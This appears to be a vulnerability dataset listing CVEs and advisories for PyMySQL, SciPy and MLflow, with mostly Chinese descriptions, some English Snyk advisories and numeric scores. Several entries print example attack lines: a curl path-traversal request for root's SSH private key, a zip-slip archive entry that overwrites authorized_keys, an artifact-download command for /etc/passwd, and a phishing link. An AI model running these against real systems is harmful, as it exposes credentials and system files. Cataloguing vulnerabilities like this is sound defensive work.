mindsdb_mindsdb,pymysql,,True,CVE-2024-36039,CWE-89,2024-05-21,当PyMySQL 1.1.0及以下版本与未受信任的JSON输入一起使用时，由于escape_dict未能对键进行转义，导致存在SQL注入漏洞。攻击者通过构造恶意的JSON输入，可以在数据库层面执行任意SQL命令。,3,0
mindsdb_mindsdb,scipy,,True,CVE-2013-4251,CWE-269,2013-10-17,"SciPy是SciPy社区的所开发的一个开源的Python算法库和数学、科学、工程计算包，它包含了线性代数、积分、特殊函数等计算模块。
SciPy 0.12.1之前版本中存在安全漏洞。本地攻击者可利用该漏洞以运行‘scipy.weave’组件的用户权限执行任意代码。",2,0
mindsdb_mindsdb,scipy,,True,CVE-2023-29824,CWE-416,2023-07-06,"SciPy是Scipy社区的所开发的一个开源的Python算法库和数学、科学、工程计算包，它包含了线性代数、积分、特殊函数等计算模块。
SciPy 1.8.0之前版本存在安全漏洞，该漏洞源于Py_FindObjects()函数存在内存释放后重用问题。",1,2
mindsdb_mindsdb,scipy,,True,CVE-2023-25399,CWE-401,2023-07-05,"SciPy是Scipy社区的所开发的一个开源的Python算法库和数学、科学、工程计算包，它包含了线性代数、积分、特殊函数等计算模块。
SciPy 存在安全漏洞，该漏洞源于在Py_FindObjects()函数中存在导致潜在内存泄漏的重新计数问题。",3,0
mindsdb_mindsdb,mlflow,,True,CVE-2024-0520,CWE-22,,Mlflow是一个开源的平台，用于简化机器学习开发的生命周期，包括实验跟踪、代码打包和模型共享与部署。该漏洞源于`mlflow.data.http_dataset_source.py`模块中操作系统命令的特殊元素未得到正确中和，攻击者可以通过操控`Content-Disposition`头部中的文件名或URL路径包含恶意输入来执行任意代码。此漏洞允许攻击者完全控制文件路径，通过路径遍历或绝对路径技术，实现任意文件写入，例如用'../../tmp/poc.txt'或'/tmp/poc.txt'。,1,1
mindsdb_mindsdb,mlflow,,True,CVE-2024-3099,CWE-475,,Mlflow 是一个用于简化机器学习开发的开源平台，支持跟踪实验、打包可重复的运行和共享与部署模型。该漏洞源于对模型名称的验证不足，允许攻击者通过 URL 编码创建多个同名模型，因此可能导致拒绝服务（DoS），同时攻击者还可以利用此漏洞对数据模型进行污染。由于 URL 编码的模型在处理时被视为与其解码版本不同，从而导致了这一安全问题。,3,1
mindsdb_mindsdb,mlflow,,True,CVE-2024-2928,CWE-29 CWE-22,,MLflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习开发过程，包括实验跟踪、代码打包以及模型的共享与部署。该平台存在安全漏洞，主要由于在解析 URI 片段时未能妥善验证其内容。攻击者可以通过操纵 URI 片段的部分，利用目录遍历序列如 '../' 来读取本地文件系统上的任意文件，甚至包括敏感文件如 '/etc/passwd'。该漏洞是对之前补丁的绕过，表明需要对 URI 的所有部分进行全面验证以防止本地文件包含攻击。,2,1
mindsdb_mindsdb,mlflow,,True,,,2023-05-01,"### Impact

Users of the MLflow Open Source Project who are hosting the MLflow Model Registry using the ``mlflow server`` or ``mlflow ui`` commands using an MLflow version older than **MLflow 2.3.1** may be vulnerable to a remote file access exploit if they are not limiting who can query their server (for example, by using a cloud VPC, an IP allowlist for inbound requests, or authentication / authorization middleware).

This issue only affects users and integrations that run the ``mlflow server`` and ``mlflow ui`` commands. Integrations that do not make use of ``mlflow server`` or ``mlflow ui`` are unaffected; for example, the Databricks Managed MLflow product and MLflow on Azure Machine Learning do not make use of these commands and are not impacted by these vulnerabilities in any way.

The vulnerability is very similar to https://nvd.nist.gov/vuln/detail/CVE-2023-1177, and a separate CVE will be published and updated here shortly.

### Patches

This vulnerability has been patched in MLflow 2.3.1, which was released to PyPI on April 27th, 2023. If you are using ``mlflow server`` or ``mlflow ui`` with the MLflow Model Registry, we recommend upgrading to MLflow 2.3.1 as soon as possible.

### Workarounds
If you are using the MLflow open source ``mlflow server`` or ``mlflow ui`` commands, we strongly recommend limiting who can access your MLflow Model Registry and MLflow Tracking servers using a cloud VPC, an IP allowlist for inbound requests, authentication / authorization middleware, or another access restriction mechanism of your choosing.

If you are using the MLflow open source ``mlflow server`` or ``mlflow ui`` commands, we also strongly recommend limiting the remote files to which your MLflow Model Registry and MLflow Tracking servers have access. For example, if your MLflow Model Registry or MLflow Tracking server uses cloud-hosted blob storage for MLflow artifacts, make sure to restrict the scope of your server's cloud credentials such that it can only access files and directories related to MLflow.

### References
",1,-2
mindsdb_mindsdb,mlflow,,True,,CWE-23,2023-05-04,"## Overview
[mlflow](https://pypi.org/project/mlflow/) is a platform to streamline machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models.

Affected versions of this package are vulnerable to Relative Path Traversal due to allowing the ability to provide relative paths in registered model sources. 

**Note:**

This issue only affects users and integrations that run the `mlflow server` and `mlflow ui` commands. Integrations that do not make use of `mlflow server` or `mlflow ui` are unaffected; for example, the Databricks Managed MLflow product and MLflow on Azure Machine Learning do not make use of these commands and are not impacted by these vulnerabilities in any way.

## Workaround

Users who are unable to upgrade to the fixed version should limit who can access MLflow Model Registry and MLflow Tracking servers using a cloud VPC, an IP allowlist for inbound requests, authentication / authorization middleware, or another access restriction mechanism.
## Remediation
Upgrade `mlflow` to version 2.3.1 or higher.
## References
- [GitHub Commit](https://github.com/mlflow/mlflow/commit/f73147496e05c09a8b83d95fb4f1bf86696c6342)
- [GitHub Issue](https://github.com/mlflow/mlflow/issues/8273)
- [GitHub PR](https://github.com/mlflow/mlflow/pull/8281)
- [GitHub Release](https://github.com/mlflow/mlflow/releases/tag/v2.3.1)
",1,2
mindsdb_mindsdb,mlflow,,True,,CWE-284,2023-05-02,"## Overview
[mlflow](https://pypi.org/project/mlflow/) is a platform to streamline machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models.

Affected versions of this package are vulnerable to Access Restriction Bypass. Users of the MLflow Open Source Project who are hosting the MLflow Model Registry using the `mlflow server` or `mlflow ui` commands  may be vulnerable to a remote file access exploit if they are not limiting who can query their server (for example, by using a cloud VPC, an IP allowlist for inbound requests, or authentication / authorization middleware).

This issue only affects users and integrations that run the ``mlflow server`` and ``mlflow ui`` commands. Integrations that do not make use of ``mlflow server`` or ``mlflow ui`` are unaffected; for example, the Databricks Managed MLflow product and MLflow on Azure Machine Learning do not make use of these commands and are not impacted by these vulnerabilities in any way. The vulnerability is very similar to [CVE-2023-1177](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-3373049)

## Workarounds
If you are using the MLflow open source `mlflow server` or `mlflow ui` commands, we strongly recommend limiting who can access your MLflow Model Registry and MLflow Tracking servers using a cloud VPC, an IP allowlist for inbound requests, authentication / authorization middleware, or another access restriction mechanism of your choosing.

If you are using the MLflow open source `mlflow server` or `mlflow ui` commands, we also strongly recommend limiting the remote files to which your MLflow Model Registry and MLflow Tracking servers have access. For example, if your MLflow Model Registry or MLflow Tracking server uses cloud-hosted blob storage for MLflow artifacts, make sure to restrict the scope of your server's cloud credentials such that it can only access files and directories related to MLflow.
## Remediation
Upgrade `mlflow` to version 2.3.1 or higher.
## References
- [GitHub PR](https://github.com/mlflow/mlflow/pull/8281)
",1,2
mindsdb_mindsdb,mlflow,,True,,CWE-22,2023-07-02,"## Overview
[mlflow](https://pypi.org/project/mlflow/) is a platform to streamline machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models.

Affected versions of this package are vulnerable to Directory Traversal via the function `_validate_non_local_source_contains_relative_paths` due to improper validation of the 'source' parameter.

## Details

A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with ""dot-dot-slash (../)"" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.

Directory Traversal vulnerabilities can be generally divided into two types:

- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.

`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.

If an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.

```
curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa
```
**Note** `%2e` is the URL encoded version of `.` (dot).

- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. 

One way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.

The following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:

```
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys
```

## Remediation
Upgrade `mlflow` to version 2.4.1 or higher.
## References
- [GitHub ChangeLog](https://github.com/mlflow/mlflow/blob/6701fca95c8ee9ce1712c09a5291b0531c2fb108/CHANGELOG.md?plain=1#L14)
- [GitHub PR](https://github.com/mlflow/mlflow/pull/8648)
",2,2
mindsdb_mindsdb,mlflow,,True,CVE-2023-2780,CWE-29,,mlflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习模型的开发和部署。该漏洞源于 mlflow 没有正确验证来源的 URL，导致攻击者能够通过相对路径访问预期目录之外的文件并读取任意文件。攻击者可以使用形如 'file://./etc/' 的字符串绕过检查，从而下载与 mlflow 无关的任意文件，包括服务器上已存储的敏感文件。,1,1
mindsdb_mindsdb,mlflow,,True,CVE-2023-30172,CWE-22,2023-05-10,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow v2.0.1版本及之前版本存在安全漏洞。攻击者利用该漏洞可以通过path参数读取服务器上的任意文件。",2,2
mindsdb_mindsdb,mlflow,,True,CVE-2023-2356,CWE-23,,MLflow 是一个开源的机器学习平台，用于管理机器学习项目、跟踪实验、构建模型和部署代码。MLflow 在 2.3.1 版本之前存在文件读取漏洞。攻击者在请求 /api/2.0/mlflow/registered-models/create 路由时可以通过 source 参数指定路径，随后利用 /model-versions/get-artifact 路由读取任意文件内容，可能导致敏感信息泄露。,2,1
mindsdb_mindsdb,mlflow,,True,CVE-2024-27133,CWE-79,2024-02-23,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow 存在跨站脚本漏洞，该漏洞源于缺乏对 dataset table字段的清理，导致跨站脚本。",2,0
mindsdb_mindsdb,mlflow,,True,CVE-2024-27132,CWE-79,2024-02-23,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow 存在跨站脚本漏洞，该漏洞源于缺乏对 template变量的清理，导致跨站脚本。",2,0
mindsdb_mindsdb,mlflow,,True,CVE-2023-6977,CWE-29,,MLflow 是一个用于简化机器学习开发的开源平台，支持实验跟踪、代码打包以及模型的共享和部署。在版本 2.9.2 之前的 MLflow 中，存在一个安全漏洞。该漏洞源于 `is_local_uri()` 函数未能正确验证 URI，攻击者可以利用此漏洞从主机服务器下载任意文件，包括任何主机服务器可以访问的远程位置的文件。该漏洞允许攻击者读取服务器上的敏感文件。,1,1
mindsdb_mindsdb,mlflow,,True,CVE-2023-6909,CWE-29,,MLflow 是一个开源的平台，用于简化机器学习的开发，包括跟踪实验、将代码打包成可重现的运行以及共享和部署模型。受影响的版本在处理特制的文件路径时存在路径遍历问题，攻击者可能利用此漏洞读取或写入限制目录外的文件，这主要是由于在特定函数 `validate_path_is_safe` 中对路径的不足消毒所致。利用此漏洞时，攻击者提交经过设计的文件路径，可能包括 `..\` 序列，造成对任意文件的访问。,2,1
mindsdb_mindsdb,mlflow,,True,CVE-2023-6975,CWE-29,,mlflow 是一个开源的机器学习生命周期管理平台，具有实验跟踪、代码打包和模型共享等功能。存在路径遍历漏洞，攻击者可以通过特制的路径输入（利用目录遍历序列）来获取未授权的读或写权限，从而访问服务器上的文件。该漏洞源于对 FTP 模型中的路径验证的不当处理，允许攻击者进行远程代码执行，并检索数据和模型信息。,1,1
mindsdb_mindsdb,mlflow,,True,CVE-2023-6976,CWE-434,,MLflow 是一个开放源代码的平台，用于简化机器学习开发，包括追踪实验、将代码打包为可重复运行的代码和共享及部署模型。受影响的版本存在目录遍历漏洞，通过在路径名中包含 `#` 可以绕过 `validate_path_is_safe()` 检查，从而允许攻击者向服务器上任意位置写入文件。该漏洞可以通过恶意的 `zip` 压缩包利用，导致路径遍历，最终在服务器的文件系统中写入恶意代码。,2,1
mindsdb_mindsdb,mlflow,,True,CVE-2023-6974,CWE-918,,MLflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习项目的开发与管理。然而，MLflow 存在一个服务器端请求伪造 (SSRF) 漏洞。该漏洞的根本原因在于在处理 HTTP 请求时未能正确限制重定向行为，攻击者可以利用 `_download_file()` 函数触发此漏洞，访问内部资源并实现任意文件写入。,2,1
mindsdb_mindsdb,mlflow,,True,CVE-2023-6940,CWE-77,,mlflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习模型的开发、跟踪和部署。此漏洞源于对 jinja2 模板引擎的处理不当，攻击者可以利用其绕过安全限制，从而在受害者的系统上进行完整的命令执行。受影响的版本为 1.27.0 至 2.9.1，攻击者只需通过一次用户交互（例如下载恶意配置）即可发起攻击。,1,1
mindsdb_mindsdb,mlflow,,True,CVE-2023-6831,CWE-29 CWE-22,,Mlflow是一个开源的机器学习生命周期管理平台，旨在简化机器学习模型的开发和部署。在版本2.9.2之前，Mlflow存在路径遍历漏洞。该漏洞的根本原因是对文件处理机制中传入的特殊输入没有进行适当的检查。攻击者可以通过对路径的URL编码来绕过安全验证。利用该漏洞，攻击者可以在受害者服务器上删除任意文件，具体取决于用户的权限。,2,1
mindsdb_mindsdb,mlflow,,True,CVE-2023-6753,CWE-22,,Mlflow是一个机器学习生命周期的开源平台，旨在简化机器学习开发过程，包括跟踪实验、将代码打包成可重现的运行以及共享和部署模型。在Mlflow的2.9.2之前版本中，存在路径遍历漏洞，此漏洞源于在加载数据集时未能正确处理URL路径，允许攻击者通过操控URL路径中的文件名，利用后斜杠来绕过目录限制，实现写入当前工作目录以外的文件。例如，通过构造恶意URL，用户可以被诱骗加载攻击者指定的文件，从而造成任意文件写入。,1,1
mindsdb_mindsdb,mlflow,,True,CVE-2023-6709,CWE-1336,,Mlflow是一个机器学习生命周期的开源平台。该平台允许用户跟踪实验、打包代码为可重现的运行并共享和部署模型。Mlflow的2.9.2之前的版本存在安全漏洞，源于模板引擎中对特殊元素的处理不当。攻击者可以通过注入恶意输入到模板系统，从而在用户机器上执行任意代码。为了利用此漏洞，用户必须加载其在互联网上找到的配方配置。,1,1
mindsdb_mindsdb,mlflow,,True,CVE-2023-6568,CWE-79,,Mlflow 是一个开源机器学习生命周期管理平台，允许用户跟踪实验、打包代码以及共享和部署模型。受影响版本在 2.9.0 之前，存在跨站脚本漏洞。攻击者可以通过在 POST 请求的 Content-Type 头中注入恶意代码，这些代码在缺乏适当消毒或转义的情况下反射回用户。这可能导致用户会话被劫持、敏感信息被窃取或在用户代理的上下文中执行其他恶意操作。,3,1
mindsdb_mindsdb,mlflow,,True,CVE-2023-43472,CWE-200,2023-12-05,MLflow 是一个用于管理机器学习生命周期的开源平台，提供了实验追踪、模型管理、项目打包等功能。MLflow 2.8.1版本及之前的版本存在一个安全漏洞，原因是特制 REST API 请求的处理不当。攻击者可以通过发送特制的 REST API 请求来获取敏感信息。,2,1
mindsdb_mindsdb,mlflow,,True,CVE-2023-6014,CWE-598,,MLflow是一个开源的机器学习平台，旨在简化机器学习模型的开发和管理。此漏洞源于MLflow在其服务器和用户界面中实现基本身份验证的不当处理，允许攻击者绕过身份验证。具体而言，攻击者可以利用REST API创建用户/凭据集合，从而未授权访问模型、实验及系统中的其他重要数据。,1,1
mindsdb_mindsdb,mlflow,,True,CVE-2023-6015,CWE-22,,MLflow 是一个开源平台，用于简化机器学习开发，包括跟踪实验、将代码打包成可重现的运行并共享和部署模型。受影响的版本存在路径遍历漏洞，该漏洞源于在 `handlers.py` 中的检查被跳过。攻击者可以通过路径遍历攻击从 Windows 的根目录中突破，读取或写入主机上的敏感数据（可能包括 SSH 密钥）。此漏洞仅在 Windows 操作系统上可被利用，利用示例包括发送包含 `C:../` 的请求。,1,1
mindsdb_mindsdb,mlflow,,True,CVE-2023-1177,CWE-29 CWE-22,,MLflow是一个开源的平台，用于简化机器学习的开发，包括跟踪实验、将代码打包成可重复运行的方式以及共享和部署模型。在使用mlflow-server和mlflow-ui命令的情况下，存在路径遍历漏洞，攻击者可以利用此漏洞从主机服务器下载任意文件，包括与MLflow无关的文件。这一问题仅影响运行这些命令的用户，以及相关集成，比如在未受到限制的环境中使用此命令。,1,1
mindsdb_mindsdb,mlflow,,True,CVE-2022-0736,CWE-377,2022-02-23,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow 中存在安全漏洞，该漏洞源于产品的tempfile.mktemp()函数未能正确处理多进程状态。攻击者可通过该漏洞创建同名临时文件。以下产品及版本受到影响：Mlflow 1.23.1 之前版本。",2,2
mindsdb_mindsdb,mlflow,,True,CVE-2023-4033,CWE-78,,Mlflow 是一个开源的机器学习生命周期管理平台，提供实验跟踪、模型管理等功能。版本 2.6.0 之前的 mlflow 存在操作系统命令注入漏洞。该漏洞的根本原因是 `backend.py` 文件中的 `predict()` 方法未能正确转义参数，导致攻击者可以向 `models predict` 操作的 CLI 参数中注入恶意命令。当系统使用不当时，攻击者能够执行任意操作系统命令。,2,1
mindsdb_mindsdb,mlflow,,True,CVE-2023-3765,CWE-36,,Mlflow 是一个开源的机器学习生命周期管理平台。受影响的版本在 validate_path_is_safe() 函数中存在路径遍历漏洞，导致对绝对 Windows 路径的处理不当。攻击者可以利用此漏洞列出、下载、写入和删除系统文件。此漏洞仅在运行 Windows 操作系统的主机上可被利用。,1,1
mindsdb_mindsdb,mlflow,,True,CVE-2023-1176,CWE-36,,MLflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习的开发过程，包括实验追踪、代码打包和模型共享及部署。如果使用早于 MLflow 2.2.1 的版本，且未限制谁可以查询其服务器，可能会受到远程文件存在检查漏洞的影响。该漏洞发生在运行 mlflow server 或 mlflow ui 命令时，由于未对模型名称进行适当验证，导致攻击者能够检查主机服务器上任意文件的存在性。,3,1
mindsdb_mindsdb,mlflow,,True,CVE-2024-3573,CWE-29 CWE-22,,Mlflow 是一个开源的机器学习开发平台，旨在简化模型的训练、注册和部署。该平台的漏洞源于其 `is_local_uri` 函数对 URI 的解析不当，使得攻击者能够绕过检查并读取系统上的任意文件。具体来说，该函数未能正确处理空或 'file' 方案的 URI，从而导致误判 URI 为非本地。利用此漏洞，攻击者可以通过创建恶意模型版本并巧妙构造 'source' 参数，读取到服务器根目录下至少两个目录层级内的敏感文件。,1,1
mindsdb_mindsdb,mlflow,,True,CVE-2024-1560,CWE-22,,Mlflow是一个机器学习生命周期的开源平台，旨在帮助用户简化机器学习模型的管理和部署。Mlflow 2.9.2版本存在路径遍历漏洞，该漏洞源于无法正确清理用户提供的路径，攻击者可以利用该漏洞删除服务器文件系统上的任意目录。该漏洞的根本原因是`local_artifact_repo.py`中的`delete_artifacts`函数存在额外的url反转操作，导致无法有效防止路径遍历序列的出现。攻击者可以利用`_delete_artifact_mlflow_artifacts`处理程序和`local_file_uri_to_path`函数中的双重解码过程来触发该漏洞。,2,1
mindsdb_mindsdb,mlflow,,True,CVE-2024-3848,CWE-29 CWE-22,,mlflow 是一个用于简化机器学习开发的开源平台，允许跟踪实验、将代码打包为可重现的运行，并分享和部署模型。受影响的版本 2.11.0 存在路径遍历漏洞，该漏洞源于对创建的 artifact URL 的片段部分验证不当。攻击者可以通过构造特定的 URL（使用 '#' 字符插入路径）来绕过验证，进而访问文件系统路径，从而读取任意文件，包括敏感信息如 SSH 和云密钥。,2,1
mindsdb_mindsdb,mlflow,,True,CVE-2024-4263,CWE-284,,Mlflow 是一个用于简化机器学习开发的开源平台，提供跟踪实验、将代码包装为可重复运行的代码以及共享和部署模型的功能。Mlflow 2.10.1 之前的版本在处理用户 EDIT 权限的 DELETE 请求时缺乏适当的验证，这导致低权限攻击者能够在未授权的情况下删除任何工件。这种漏洞的根本原因在于访问控制的错误实现，允许攻击者以其低权限删除包括目录在内的工件。这种不当访问控制使得原本只能读取和更新工件的用户能够进行删除操作。,3,1
mindsdb_mindsdb,mlflow,,True,CVE-2024-1558,CWE-22,,Mlflow 是一个机器学习生命周期的开源平台。该漏洞源于对 'source' 参数验证不当。在 `_create_model_version` 函数中，攻击者可以发送特制的 `source` 参数，绕过 `_validate_non_local_source_contains_relative_paths(source)` 函数的检查，从而获得对服务器上任意文件的读取访问权限。这一问题源于处理未加引号的URL字符及在模型版本创建时错误地使用原始 'source' 值，导致在与 `/model-versions/get-artifact` 处理程序交互时敏感文件暴露。,2,1
mindsdb_mindsdb,mlflow,,True,CVE-2024-1483,CWE-22,,Mlflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习开发过程，包括跟踪实验、打包代码并分享和部署模型。Mlflow 2.9.2版本存在路径遍历漏洞，该漏洞源于对用户输入验证不足。攻击者可以通过构造特定的HTTP POST请求，利用 'artifact_location' 和 'source' 参数，使用包含 '#' 组件的本地URI，访问服务器上的任意文件。这种攻击利用了目录遍历，允许攻击者访问服务器上不应被公开的文件。,2,1
mindsdb_mindsdb,mlflow,,True,CVE-2024-1593,CWE-22,,Mlflow是一个机器学习生命周期的开源平台。该平台用于简化机器学习开发，包括实验跟踪、将代码打包为可重复运行的程序以及共享和部署模型。Mlflow存在路径遍历漏洞，该漏洞源于对URL参数处理不当。攻击者可以利用;字符在URL中传递路径遍历序列，从而操控URL的params部分，获得对系统中文件或目录的未授权访问。攻击者可以使用像'../'这样的路径序列，访问存储在文件系统中任意的文件或目录。,2,1
mindsdb_mindsdb,mlflow,,True,CVE-2024-1594,CWE-22,,Mlflow是一个机器学习生命周期的开源平台。该漏洞存在于Mlflow 2.9.2版本及更早版本中，攻击者可以利用该漏洞在创建实验时，通过操纵'artifact_location'参数来触发路径遍历攻击。在URI中使用片段组件'#'，攻击者可以读取服务器上任意文件。这个漏洞类似于CVE-2023-6909，但利用了URI中的不同组件来达到相同效果。,2,1
mindsdb_mindsdb,mlflow,,True,CVE-2023-6018,CWE-78,,MLflow 是一个开源的平台，用于简化机器学习的开发流程，包括实验的跟踪、代码的封装和模型的共享与部署。在受到影响的版本中，通过对 `/ajax-api/2.0/mlflow/model-versions/create` 的请求，存在操作系统命令注入漏洞。攻击者可以利用此漏洞覆盖 MLflow 服务器上的任意文件，从而在受影响的机器上执行命令并获取数据和模型信息。,1,1
mindsdb_mindsdb,mlflow,,True,CVE-2024-6838,CWE-400,,MLflow是一个开源的机器学习开发平台，旨在简化机器学习项目的管理，提供实验跟踪、模型部署等功能。在MLflow版本v2.13.2中，由于实验名称缺少限制，存在安全漏洞，允许创建或重命名实验时使用大量整数，这可能导致MLflow用户界面失去响应，从而导致拒绝服务。此外，在创建实验时，`artifact_location`参数也没有字符限制。,3,1
mindsdb_mindsdb,mlflow,,True,CVE-2025-0453,CWE-410,,MLFlow 是一个开源的机器学习平台，旨在简化机器学习工作流的管理。在 MLFlow 版本 2.17.2 中，`/graphql` 端点存在拒绝服务攻击（DoS）的漏洞。攻击者可以创建大量复杂的查询批次，反复请求特定实验下的所有运行记录，导致 MLFlow 分配的所有工作者被大量请求占用，无法响应其他请求。这一漏洞源于对资源消耗的未受控管理。,2,1
mindsdb_mindsdb,mlflow,,True,CVE-2025-52967,CWE-918,2025-06-23,MLflow是一款用于管理机器学习生命周期的开源平台，涵盖了实验跟踪、项目部署和模型管理等功能。该漏洞涉及MLflow中的gateway_proxy_handler组件，该组件负责处理网关路径请求，然而在版本3.1.0之前，其路径验证功能存在缺失。这种缺陷使得某些未经验证的输入可以通过此组件传递，可能导致非法请求被接收和处理。,3,2
mindsdb_mindsdb,mlflow,,True,CVE-2024-27134,CWE-276 CWE-367,2024-11-25,MLflow 是一个开源的平台，旨在简化机器学习开发，它包括了管理和跟踪实验、将代码打包成可重复的运行以及共享和部署模型的能力。在 MLflow 中，由于目录权限设置过多，使用 spark_udf 功能时存在本地特权升级的漏洞。这意味着攻击者可以通过利用这一漏洞获得更高的系统权限，从而执行未授权的操作。,2,0
mindsdb_mindsdb,mlflow,,True,CVE-2025-1473,CWE-352,,mlflow 是一个开源的机器学习平台，旨在管理机器学习生命周期的各个方面，包括实验跟踪、项目包装和模型部署。在版本 2.17.0 到 2.20.1 的注册功能中，存在跨站请求伪造（CSRF）漏洞。攻击者可以利用这一漏洞创建新账户，从而可在恶意用户的名义下执行未经授权的操作。这一漏洞的根本原因是对 CSRF 攻击缺乏足够的防护和验证，特别是在处理用户注册请求时。,2,1
mindsdb_mindsdb,mlflow,,True,CVE-2024-8859,CWE-29,,MLflow是一个开源的平台，旨在简化机器学习开发，包括跟踪实验、打包代码和共享模型。在MLflow的2.15.1版本中，发现了一个路径遍历漏洞，该漏洞源于dbfs服务的不当配置。具体而言，漏洞发生在`_validate_non_local_source_contains_relative_paths()`函数中，当`dbfs`服务被配置并挂载到本地目录而不是Databricks时，攻击者可以通过操纵`file:`协议中的URL读取任意文件，因为该实现未能适当清理路径之外的输入，如查询和参数。,2,1
mindsdb_mindsdb,mlflow,,True,CVE-2025-1474,CWE-521,,在 MLflow 版本 2.18 中，管理员可以在未设置密码的情况下创建新用户账户。MLflow 是一个开源的机器学习平台，旨在简化机器学习的开发和管理。由于缺乏对设置密码的要求，该漏洞可能导致未授权访问，从而引发安全风险。此外，这一做法违反用户账户安全管理的最佳实践。该漏洞已在版本 2.19.0 中修复。,3,1
mindsdb_mindsdb,mlflow,,True,,,,<p>mlflow 是一个用于机器学习项目的开源平台，提供实验跟踪、模型管理等功能。在测试过程中发现，当用户访问日志中的 PDF 工件时，存在定制 JavaScript 执行的漏洞。该漏洞是由项目的默认安装中使用的易受攻击的 PDFjs 封装导致的。攻击者可以通过上传特制的 PDF 文件来引发 JavaScript 的执行，从而影响其他用户。</p>,3,1
mindsdb_mindsdb,mlflow,,True,,,,<p>mlflow是一个开源的机器学习平台，允许数据科学家和开发者使用不同的工具进行机器学习模型的构建和管理。在AWS上，发现一个未被声明的S3存储桶，攻击者可以声称这个存储桶并获得对它的控制权。这种漏洞的根本原因是对S3存储桶的管理不当，导致存储桶处于可被恶意接管的状态。攻击者可通过直接访问未声明的S3存储桶地址，执行接管操作。</p>,2,1
mindsdb_mindsdb,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习平台，用于管理机器学习项目的整个生命周期，包括实验、重现和部署。该漏洞存在于 Github Actions 的工作流中，攻击者可以提交包含可执行代码的恶意 Pull Request，这些代码在没有适当授权的情况下执行，从而导致敏感令牌泄露并危及代码库的安全。</p>,1,1
mindsdb_mindsdb,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习平台，旨在帮助数据科学家和开发人员管理机器学习生命周期。该漏洞存在于创建实验与模型的功能中，攻击者可以利用跨站请求伪造（CSRF）攻击来在未授权用户的情况下创建实验和模型。具体来说，当用户访问精心构造的网页时，该攻击可以自动提交请求以创建新的模型，如“test”。</p>,3,1
mindsdb_mindsdb,mlflow,,True,,,,<p>MLFlow 是一个用于机器学习操作的程序，允许工程师运行、记录和重现他们的实验与模型。当攻击者利用符号链接和日志记录功能时，可能导致内部机密文件的曝光。漏洞的根本原因在于使用 Python 的 `with open` 函数，在处理符号链接的过程中不当处理导致泄露。如果攻击者成功提取了符号链接的归档文件并存储在跟踪服务器上，就能够利用 MLFlow API 获取相关文件。一旦攻击者获得 SSH 密钥，则可能导致对其他模型及其相关数据的访问。</p>,3,1
mindsdb_mindsdb,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习平台，用于管理机器学习项目的开发、实验和部署。当一个页面未能设置适当的 X-Frame-Options 或 Content-Security-Policy HTTP 头时，攻击者可以在其控制的页面中通过 iframe 加载受影响的页面。这种漏洞的根本原因在于缺乏必要的防护措施。攻击者可通过在用户的浏览器中叠加一个虚假的用户界面，诱使受害者进行诸如鼠标点击和键盘输入等操作，进而在被攻击的应用中无意执行指令。</p>,4,1
mindsdb_mindsdb,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习生命周期管理工具，允许用户追踪实验、项目和最终模型。在使用 mlflow cli 命令下载工件时，存在本地文件包含漏洞，攻击者可以通过提供不安全的 URI 来下载服务器上任何位置的文件。攻击者可以利用这一漏洞，执行类似 'mlflow artifacts download -u /etc/passwd -d /home/ubuntu/test/' 的命令，将 /etc/passwd 的内容下载到本地目录，从而暴露敏感信息。</p>,2,1
mindsdb_mindsdb,mlflow,,True,,,,"<p>mlflow是一个开源的机器学习平台，旨在简化并优化机器学习模型的管理和部署。当使用`dangerouslySetInnerHTML`方法渲染用户输入的内容时，如果未采取适当的输入验证，就会导致HTML注入漏洞。攻击者可以通过存储恶意HTML代码创建假网页，例如使用标记<a href=""http://evil.com"" rel=""noopener noreferrer"" target=""_blank"">click here to get gift</a>来实施钓鱼攻击，将受害者重定向到另一个网站。</p>",3,1
mindsdb_mindsdb,mlflow,,True,,,,<p>mlflow是一个用于机器学习生命周期管理的开源平台，支持多种机器学习模型的实验跟踪、项目管理和模型部署。该漏洞源于使用pickle.load函数不当，攻击者可以借此加载恶意构造的pickle文件。当用户从互联网下载一个模型并使用该框架检查模型训练结果时，可能会触发代码执行。具体的执行流程是，当检查'train'步骤时，会调用inspect函数，继而调用BaseCard.load方法加载卡片模型，这一过程可能导致任意代码执行。</p>,3,1
